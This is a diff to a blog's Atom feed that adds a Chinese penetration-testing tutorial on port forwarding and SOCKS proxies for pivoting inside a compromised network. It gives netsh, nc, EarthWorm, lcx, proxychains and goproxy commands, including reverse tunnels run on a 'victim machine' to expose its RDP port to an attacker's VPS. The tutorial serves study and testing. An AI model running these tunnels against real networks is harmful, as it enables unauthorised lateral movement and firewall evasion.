@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zzggtt.github.io</id>
     <title>ZG0T01</title>
-    <updated>2020-11-18T12:48:59.514Z</updated>
+    <updated>2020-11-18T12:51:24.841Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zzggtt.github.io"/>
     <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
@@ -10,6 +10,169 @@
     <logo>https://zzggtt.github.io/images/avatar.png</logo>
     <icon>https://zzggtt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, ZG0T01</rights>
+    <entry>
+        <title type="html"><![CDATA[渗透基础 - 端口转发与边界代理]]></title>
+        <id>https://zzggtt.github.io/post/shen-tou-ji-chu-duan-kou-zhuan-fa-yu-bian-jie-dai-li/</id>
+        <link href="https://zzggtt.github.io/post/shen-tou-ji-chu-duan-kou-zhuan-fa-yu-bian-jie-dai-li/">
+        </link>
+        <updated>2020-11-18T12:41:00.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="端口转发">端口转发</h3>
+<p><code>端口转发:</code></p>
+<p>转发一个<strong>网络端口</strong>的数据从一个网络节点到另一个网络节点的行为。</p>
+<p><code>应用场景：</code></p>
+<p>在进行渗透时，已拿下内网中一台机器的权限，但是想横向渗透内网中的其他机器时。</p>
+<p>Client（攻击者）通过Transit Server（内网中已拿下权限的机器）建立的<strong>通道</strong>，连接内网Server（内网中其他机器）的指定端口。</p>
+<p><code>正向转发</code></p>
+<p>Client能够<strong>正向</strong>连接Transit server。Transit server直接转发即可：</p>
+<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605703324992.png" alt="" loading="lazy"></figure>
+<pre><code class="language-bash">netsh interface portproxy add v4tov4 listenaddress=192.168.111.132 listenport=7777 connectaddress=192.168.111.103  connectport=4444
+</code></pre>
+<pre><code class="language-bash">nc -lvp 4444
+</code></pre>
+<pre><code class="language-bash">nc -vv 192.168.111.132 7777
+</code></pre>
+<p><code>反向转发</code></p>
+<p>Client无法正向连接Transit server，但Transit server能够<strong>反向</strong>连接Client：</p>
+<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1605703332371.png" alt="" loading="lazy"></figure>
+<pre><code class="language-bash">ew -s lcx_listen -l 2222 -e 1111
+</code></pre>
+<pre><code class="language-bash">ew -s lcx_slave -d 1.1.1.1 -e 1111 -f 10.0.0.2 -g 3389
+</code></pre>
+<pre><code class="language-bash">nc -vv 127.0.0.1 2222
+</code></pre>
+<h3 id="socks协议">Socks协议</h3>
+<p>什么是Socks协议？？<br>
+<img src="https://zzggtt.github.io/post-images/1605703395820.png" alt="" loading="lazy"></p>
+<p>中文意思：防火墙安全会话转换协议，工作在OSI参考模型的<strong>第5层（会话层）。</strong></p>
+<p>它是一种可以穿透防火墙的协议，很多场景都会用到。比如Fan墙，你们懂得~~</p>
+<p>因为Socks介于传输层与表示层之间，使用TCP协议传输数据，因而<strong>不提供如传递ICMP信息</strong>之类的网络层相关服务。</p>
+<p>目前有两个版本：SOCKS4和SOCKS5</p>
+<p>SOCKS4支持TELNET、FTPHTTP等TCP协议；</p>
+<p>SOCKS5支持TCP与UDP，并支持安全认证方案。</p>
+<p>Ps: Socks不支持ICMP，不能使用ping命令。。记住哦~~~</p>
+<p><strong>当然啦，基于socks的转发代理有很多的实用的小工具，少侠看图吧~</strong></p>
+<p>常见的转发工具及不同平台的代理链工具：</p>
+<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1605703403068.png" alt="" loading="lazy"></figure>
+<p><strong>代理链工具：</strong></p>
+<ul>
+<li>
+<p>proxychains</p>
+<p>https://howiezhao.github.io/2018/10/18/proxychains/</p>
+</li>
+<li>
+<p>proxifier</p>
+<p>https://blog.csdn.net/xhaimail/article/details/98743238</p>
+</li>
+</ul>
+<h3 id="代理">代理</h3>
+<p><code>应用场景：</code></p>
+<p>如果Client要对Server的多个端口进行扫描(或是多个Server的多个端口)，逐个配置转发规则很不现实。为了提高效率，这里可以使用代理，配置一次规则即可。<br>
+<img src="https://zzggtt.github.io/post-images/1605703445490.png" alt="" loading="lazy"></p>
+<p><code>正向代理</code></p>
+<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1605703450870.png" alt="" loading="lazy"></figure>
+<p>Client能够正向连接到Transit server，要对Server1、Server2和Server3的端口进行扫描。</p>
+<p><strong>使用EarthWorm：</strong></p>
+<p>Transit Server：</p>
+<pre><code class="language-bash">ew –s ssocksd –l 8888
+</code></pre>
+<p>Client使用代理工具连接Transit Server的8888端口，下面通过Windows的代理链工具<strong>proxifier</strong>演示：</p>
+<p>连接Transit Server：</p>
+<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1605703466633.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1605703471194.png" alt="" loading="lazy"></figure>
+<p>然后配置代理规则，client即可对内网多服务器多端口访问：<br>
+<img src="https://zzggtt.github.io/post-images/1605703491952.png" alt="" loading="lazy"></p>
+<p><code>反向代理</code></p>
+<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1605703501509.png" alt="" loading="lazy"></figure>
+<p>Client无法正向连接到Transit server，但Transit server能够反向连接到Client</p>
+<p>要对Server1、Server2和Server3的端口进行扫描。</p>
+<p><strong>使用EarthWorm：</strong></p>
+<p>Client:</p>
+<pre><code>ew -s rcsocks -l 2222 -e 1111
+</code></pre>
+<p>Transit server:</p>
+<pre><code>ew -s rssocks -d 1.1.1.1 -e 1111
+</code></pre>
+<p>使用代理工具连接Client的2222端口，下面通过Linux的代理链工具<strong>proxychains</strong>演示：</p>
+<p>Client：</p>
+<pre><code class="language-bash">//修改配置文件：（设置代理服务器）
+vim /etc/proxychains.conf
+socks5     127.0.0.1     2222
+
+//使用：（firefox走代理，访问10.0.0.2）
+proxychains firefox 10.0.0.2
+</code></pre>
+<h3 id="工具">工具</h3>
+<h4 id="端口转发-2">端口转发</h4>
+<ul>
+<li>
+<p><strong>lcx（Windows）</strong></p>
+<p>lcx是一款轻便的端口转发工具：</p>
+<p>a、反向转发</p>
+<p>外网VPS机器监听：</p>
+<p>lcx.exe -listen 1111 2222</p>
+<p>受害者机器执行：</p>
+<p>lcx.exe -slave VPSip 1111 127.0.0.1 3389</p>
+<p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p>
+<p>b、正向转发</p>
+<p>A机器执行：</p>
+<p>lcx.exe -tran 1111 2.2.2.2 8080</p>
+<p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p>
+<p>参考：https://juejin.im/post/6844903954401198088</p>
+</li>
+<li>
+<p><strong>netsh（只支持TCP协议）</strong></p>
+<p>netsh是<strong>windows</strong>自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p>
+<p>A机器（192.168.130.1）：</p>
+<pre><code class="language-bash">netsh  interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1  protocol=tcp
+</code></pre>
+<p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p>
+<p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MzU1Nzc4MTQwMA==&amp;mid=2247484209&amp;idx=1&amp;sn=982c14d94b83249c5ece1f46023de808&amp;chksm=fc31dbc6cb4652d04a088571b21098ac5a0259bbb2b30b93e11472e912e35fe2f2b628e9d128&amp;scene=21#wechat_redirect">使用netsh进行端口转发</a></p>
+</li>
+<li>
+<p><strong>portmap</strong></p>
+</li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1605703523922.png" alt="" loading="lazy"></figure>
+<ul>
+<li><strong>iptables</strong></li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1605703527604.png" alt="" loading="lazy"></figure>
+<h4 id="代理-2">代理</h4>
+<ul>
+<li>
+<p><strong>reGeorg</strong></p>
+<p>reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，把内网服务器的端口通过http/https隧道转发到本机。</p>
+<p>参考：</p>
+<p><a href="https://www.k0rz3n.com/2018/07/06/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8reGeorg+Proxifier%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91/">配置reGeorg+Proxifier渗透内网</a></p>
+<p><a href="https://xz.aliyun.com/t/228">reGeorg+Proxifier使用</a></p>
+</li>
+<li>
+<p><strong>Earthworm</strong></p>
+<p>跨平台+端口转发+socket代理结合体</p>
+<p>http://rootkiter.com/EarthWorm/</p>
+<p>https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA</p>
+</li>
+<li>
+<p><strong>goproxy</strong></p>
+<p>go实现的高性能http,https,websocket,tcp,udp,socks5,ss代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转</p>
+<p>下载地址：</p>
+<p>https://github.com/snail007/goproxy/</p>
+<p>Transit server:</p>
+<pre><code class="language-bash">proxy socks -t tcp -p &quot;0.0.0.0:8888&quot;
+</code></pre>
+</li>
+<li>
+<p><strong>ssh</strong></p>
+</li>
+<li>
+<p><strong>xsocks</strong></p>
+</li>
+</ul>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86/">渗透基础-端口转发与代理</a></p>
+<p><a href="https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA">内网渗透之代理转发</a></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[window本地认证与hash抓取]]></title>
         <id>https://zzggtt.github.io/post/window-ben-di-ren-zheng-yu-hash-zhua-qu/</id>
